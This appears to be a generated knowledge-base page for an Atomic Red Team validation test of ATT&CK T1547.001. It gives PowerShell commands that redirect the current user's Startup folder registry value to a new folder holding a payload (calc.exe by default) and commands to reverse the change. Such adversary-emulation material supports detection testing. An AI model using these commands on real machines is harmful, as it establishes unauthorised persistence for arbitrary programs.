---
atomic_guid: "8834b65a-f808-4ece-ad7e-2acdf647aafa"
title: "Change Startup Folder - HKCU Modify User Shell Folders Startup Value"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.001"
attack_technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "8834b65a-f808-4ece-ad7e-2acdf647aafa"
  - "Change Startup Folder - HKCU Modify User Shell Folders Startup Value"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Change Startup Folder - HKCU Modify User Shell Folders Startup Value

This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V "Startup" value 
to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart

## Metadata

- Atomic GUID: 8834b65a-f808-4ece-ad7e-2acdf647aafa
- Technique: T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1547.001/T1547.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.001]]

## Input Arguments

### new_startup_folder

- description: new startup folder to replace standard one
- type: string
- default: $env:TMP\atomictest\

### payload

- description: executable to be placed in new startup location 
- type: string
- default: C:\Windows\System32\calc.exe

## Executor

- name: powershell

### Command

```powershell
New-Item -ItemType Directory -path "#{new_startup_folder}"
Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
```

### Cleanup

```powershell
Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Remove-Item "#{new_startup_folder}" -Recurse -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml)
